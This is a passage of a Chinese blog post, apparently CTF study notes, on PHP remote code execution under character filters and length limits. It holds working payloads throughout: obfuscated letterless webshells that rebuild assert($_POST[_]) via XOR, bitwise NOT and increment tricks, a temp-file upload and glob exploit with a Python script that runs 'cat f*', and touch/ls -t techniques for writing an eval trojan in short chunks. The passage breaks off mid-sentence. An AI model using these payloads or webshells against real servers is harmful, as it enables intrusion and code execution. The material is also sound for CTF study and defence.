<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%01&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%12&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%14&#x27;</span>^<span class="string">&#x27;`&#x27;</span>); <span class="comment">// $_=&#x27;assert&#x27;;</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%2F&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;]&#x27;</span>); <span class="comment">// $__=&#x27;_POST&#x27;;</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>;</span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]); <span class="comment">// assert($_POST[_]);</span></span><br></pre></td></tr></table></figure>

<p>其实很像自增的感觉</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161d2c756d.png" alt="image-20240331113232883"></p>
<h4 id="法2"><a href="#法2" class="headerlink" title="法2"></a>法2</h4><p><strong>取反</strong></p>
<p>用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如<code>&#39;和&#39;&#123;2&#125;</code>的结果是<code>&quot;\x8c&quot;</code>，其取反即为字母<code>s</code>：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161ceb2bb5.png" alt="image-20240331113325366"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$__</span>=(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>)+(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>);</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$__</span>/<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$___</span>=<span class="string">&quot;瞰&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;和&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;和&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;的&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;半&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;始&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$___</span>=<span class="string">&quot;俯&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;瞰&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;次&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;站&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$_____</span>;</span><br><span class="line"><span class="variable">$____</span>(<span class="variable">$_</span>[<span class="variable">$__</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161d2cb76a.png" alt="image-20240331113423181"></p>
<p><strong>这个答案还利用了PHP的弱类型特性。因为要获取<code>&#39;和&#39;&#123;2&#125;</code>，就必须有数字2。而PHP由于弱类型这个特性，true的值为1，故<code>true+true==2</code>，也就是<code>(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)==2</code>。</strong></p>
<h4 id="法3"><a href="#法3" class="headerlink" title="法3"></a>法3</h4><p><strong>自增</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161ce2bcf0.png" alt="image-20240331113605706"></p>
<p>也就是说，<code>&#39;a&#39;++ =&gt; &#39;b&#39;</code>，<code>&#39;b&#39;++ =&gt; &#39;c&#39;</code>… 所以，我们只要能拿到一个变量，其值为<code>a</code>，通过自增操作即可获得a-z中所有字符。</p>
<p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为<code>Array</code>：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161ceb9709.png" alt="image-20240331113652179"></p>
<p>再取这个字符串的第一个字母，就可以获得’A’了。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>; <span class="comment">// $_=&#x27;Array&#x27;;</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>; <span class="comment">// A</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// E </span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// R</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// P</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// O</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$____</span>;</span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]); <span class="comment">// ASSERT($_POST[_]);</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161d2ef00f.png" alt="image-20240331113925903"></p>
<h3 id="例2-进阶-："><a href="#例2-进阶-：" class="headerlink" title="例2(进阶)："></a>例2(进阶)：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">35</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9_$]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据上题 其中有两个主要的思路：</p>
<ol>
<li>利用位运算</li>
<li>利用自增运算符</li>
</ol>
<p>相较于正常的(上面的)无字母数字RCE </p>
<p>这道题多了两个限制：</p>
<ol>
<li>webshell长度不超过35位</li>
<li>除了不包含字母数字，还不能包含<code>$</code>和<code>_</code></li>
</ol>
<p>因为<code>$</code>不能使用了，所以我们无法构造PHP中的变量 所以上述方法无法进行</p>
<p>所以 这里其实有一种新方法</p>
<p>这里重点说一下<strong>临时文件上传</strong></p>
<h4 id="PHP7下简单解决"><a href="#PHP7下简单解决" class="headerlink" title="PHP7下简单解决"></a>PHP7下简单解决</h4><p>我们将上述代码放在index.php中，然后执行<code>docker run --rm -p 9090:80 -v </code>pwd<code>:/var/www/html php:7.2-apache</code>，启动一个php 7.2的服务器。</p>
<p>php7中修改了表达式执行的<a target="_blank" rel="noopener" href="http://php.net/manual/zh/migration70.incompatible.php">顺序</a>：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161cf90a8a.png" alt="image-20240331120445300"></p>
<p>PHP7前是不允许用<code>($a)();</code>这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过<code>(&#39;phpinfo&#39;)();</code>来执行函数，第一个括号中可以是任意PHP表达式。</p>
<p>所以很简单了，构造一个可以生成<code>phpinfo</code>这个字符串的PHP表达式即可。payload如下（不可见字符用url编码表示）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161d08c7ce.png" alt="image-20240331120819058"></p>
<h4 id="PHP5下理解"><a href="#PHP5下理解" class="headerlink" title="PHP5下理解"></a>PHP5下理解</h4><h5 id="PHP5下思考"><a href="#PHP5下思考" class="headerlink" title="PHP5下思考"></a>PHP5下思考</h5><p>我们使用<code>docker run --rm -p 9090:80 -v </code>pwd<code>:/var/www/html php:5.6-apach</code>来运行一个php5.6的web环境。</p>
<p>此时，我们尝试用PHP7的payload，将会得到一个错误：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161cf5c597.png" alt="image-20240331120800881"></p>
<p>原因就是php5并不支持这种表达方式。</p>
<p>大部分语言都不会是单纯的逻辑语言，一门全功能的语言必然需要和操作系统进行交互。操作系统里包含的最重要的两个功能就是“shell（系统命令）”和“文件系统”，很多木马与远控其实也只实现了这两个功能。</p>
<p>PHP自然也能够和操作系统进行交互，“反引号”就是PHP中最简单的执行shell的方法。那么，在使用PHP无法解决问题的情况下，为何不考虑用“反引号”+“shell”的方式来getshell呢？</p>
<h5 id="PHP5-shell打破禁锢"><a href="#PHP5-shell打破禁锢" class="headerlink" title="PHP5+shell打破禁锢"></a>PHP5+shell打破禁锢</h5><p>因为反引号不属于“字母”、“数字”，所以我们可以执行系统命令，但问题来了：如何利用无字母、数字、<code>$</code>的系统命令来getshell？</p>
<p>好像问题又回到了原点：无字母、数字、<code>$</code>，在shell中仍然是一个难题。</p>
<p>此时我想到了两个有趣的Linux shell知识点：</p>
<blockquote>
<ol>
<li>shell下可以利用<code>.</code>来执行任意脚本</li>
<li>Linux文件名支持用glob通配符代替</li>
</ol>
</blockquote>
<p><strong><code>.</code>或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则<code>. file</code>的意思就是用bash执行file文件中的命令。</strong></p>
<p>用<code>. file</code>执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，那不就可以利用<code>.</code>来执行它了吗？</p>
<p>这儿主要介绍<code>php.ini</code>中的两个参数</p>
<p><code>file_uploads</code> 是否允许上传<br><code>upload_tmp_dir</code> 是默认的临时文件的保存目录（linux默认为<code>/tmp</code>）</p>
<p>这个文件也很好得到，<strong>我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是<code>/tmp/phpXXXXXX</code>，文件名最后6个字符是随机的大小写字母。</strong></p>
<p>第二个难题接踵而至，执行<code>. /tmp/phpXXXXXX</code>，也是有字母的。此时就可以用到Linux下的glob通配符：</p>
<blockquote>
<ul>
<li><code>*</code>可以代替0个及以上任意字符</li>
<li><code>?</code>可以代表1个任意字符</li>
</ul>
</blockquote>
<p>那么，<code>/tmp/phpXXXXXX</code>就可以表示为<code>/*/?????????</code>或<code>/???/?????????</code>。</p>
<p>但我们尝试执行<code>. /???/?????????</code>，却得到如下错误：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161cda411d.png" alt="image-20240331121547675"></p>
<p>这是因为，能够匹配上<code>/???/?????????</code>这个通配符的文件有很多，我们可以列出来：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161cf110ee.png" alt="image-20240331121610564"></p>
<p>可见，我们要执行的<code>/tmp/phpcjggLC</code>排在倒数第二位。然而，在执行第一个匹配上的文件（即<code>/bin/run-parts</code>）的时候就已经出现了错误，导致整个流程停止，根本不会执行到我们上传的文件。</p>
<p>思路又陷入了僵局，虽然方向没错。</p>
<h5 id="深入理解glob通配符"><a href="#深入理解glob通配符" class="headerlink" title="深入理解glob通配符"></a>深入理解glob通配符</h5><p>大部分同学对于通配符，可能知道的都只有<code>*</code>和<code>?</code>。但实际上，阅读<a target="_blank" rel="noopener" href="http://man7.org/linux/man-pages/man7/glob.7.html">Linux的文档</a>，可以学到更多有趣的知识点。</p>
<p>其中，glob支持用<code>[^x]</code>的方法来构造“这个位置不是字符x”。那么，我们用这个姿势干掉<code>/bin/run-parts</code>：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161ccee8ff.png" alt="image-20240331121817617"></p>
<p>排除了第4个字符是<code>-</code>的文件，同样我们可以排除包含<code>.</code>的文件：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161ce44f0c.png" alt="image-20240331121926648"></p>
<p>现在就剩最后三个文件了。但我们要执行的文件仍然排在最后，但我发现这三个文件名中都不包含特殊字符，那么这个方法似乎行不通了。</p>
<p>继续阅读glob的帮助，发现另一个有趣的用法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161cd70c41.png" alt="image-20240331122049924"></p>
<p>就跟正则表达式类似，glob支持利用<code>[0-9]</code>来表示一个范围。</p>
<p>我们再来看看之前列出可能干扰我们的文件：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161cf610fc.png" alt="image-20240331122112426"></p>
<p>所有文件名都是小写，只有PHP生成的临时文件包含大写字母。那么答案就呼之欲出了，我们只要找到一个可以表示“大写字母”的glob通配符，就能精准找到我们要执行的文件。</p>
<p>翻开ascii码表，可见大写字母位于<code>@</code>与<code>[</code>之间：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:\Users\admin\Desktop\ascii.png" alt="ascii"></p>
<p>那么，我们可以利用<code>[@-[]</code>来表示大写字母：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161ce62150.png" alt="image-20240331122316557"></p>
<p>显然这一招是管用的。</p>
<h5 id="构造POC-执行任意命令"><a href="#构造POC-执行任意命令" class="headerlink" title="构造POC 执行任意命令"></a>构造POC 执行任意命令</h5><p>当然，php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。</p>
<p>最后，我传入的code为<code>?&gt;&lt;?=</code>. &#x2F;???&#x2F;????????[@-[]<code>;?&gt;</code>，发送数据包如下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161cf6c79e.png" alt="image-20240331122439548"></p>
<p>成功执行任意命令。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://xxx/test.php?code=?&gt;&lt;?=`. /???/????????[@-[]`;?&gt;&quot;</span></span><br><span class="line">files=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;cat f*&#x27;</span>&#125;</span><br><span class="line">response=requests.post(url,files=files)</span><br><span class="line">html = response.text</span><br><span class="line"><span class="built_in">print</span>(html)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>除这些之外我们还可以这样用<code>$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=phpinfo</code>其中<code>&quot;%86%86%86%86^%d9%c1%c3%d2&quot;</code>为构造出的<code>_GET</code>，适合于过滤了引号的情况下使用。</p>
<h2 id="限制长度RCE"><a href="#限制长度RCE" class="headerlink" title="限制长度RCE"></a>限制长度RCE</h2><h3 id="15字符下可控"><a href="#15字符下可控" class="headerlink" title="15字符下可控"></a>15字符下可控</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="number">1</span>])&lt;<span class="number">15</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;too long&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为只能传入14个字符，但是没有限制命令执行的次数，所以我们的思想可以通过Linux下的&gt;符号与&gt;&gt;符号写入一段一句话木马到指定文件。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(</span><br><span class="line"><span class="variable">$_GET</span></span><br><span class="line">[<span class="number">1</span>]</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>经测试上述这样的一句话木马（经过换行）是可以命令执行的，所以我们可以通过传参构造出这样的一句话木马，不断传入以下Payload：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161cd8d4d6.png" alt="image-20240331192116873"></p>
<h3 id="7字符下可控"><a href="#7字符下可控" class="headerlink" title="7字符下可控"></a>7字符下可控</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]&lt;<span class="number">7</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr/&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;too long&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们可以使用touch来生成文件，然后将生成的文件名拼凑成一句命令，最后执行，达到目的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;-- cat flag.php --&gt;</span><br><span class="line">替换：</span><br><span class="line">touch &quot;hp&quot;</span><br><span class="line">touch &quot;g.p\\&quot;</span><br><span class="line">touch &quot;la\\&quot;</span><br><span class="line">touch &quot;t f\\&quot;</span><br><span class="line">touch &quot;ca\\&quot;</span><br><span class="line">ls -t</span><br><span class="line">ls -t &gt;a 将 ls -t 内容写入到a文件中</span><br><span class="line">sh a</span><br><span class="line"></span><br><span class="line">\是指换行</span><br><span class="line">ls -t将文件按时间排序输出</span><br><span class="line">sh命令可以从一个文件中读取命令来执行</span><br></pre></td></tr></table></figure>

<p>同理：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;和&gt;&gt;：</span><br><span class="line"></span><br><span class="line">&gt;b 类似于touch b，即直接创建文件b，通过&gt;来将命令执行结果写入文件会覆盖掉文件原本的内容</span><br><span class="line"></span><br><span class="line">echo kuai &gt; a  #创建文件a，并把字符串&#x27;kuai&#x27;写入到文件a里</span><br><span class="line"></span><br><span class="line">&gt;&gt;用来追加内容</span><br><span class="line"></span><br><span class="line">kuai &gt;&gt;a   #在文件a末尾追加字符串&#x27;kuai&#x27;</span><br><span class="line"></span><br><span class="line">ls -t命令：按时间顺序，由近及远排序（后创建的排在前面，只能精确到秒）</span><br></pre></td></tr></table></figure>

<p>由此：</p>
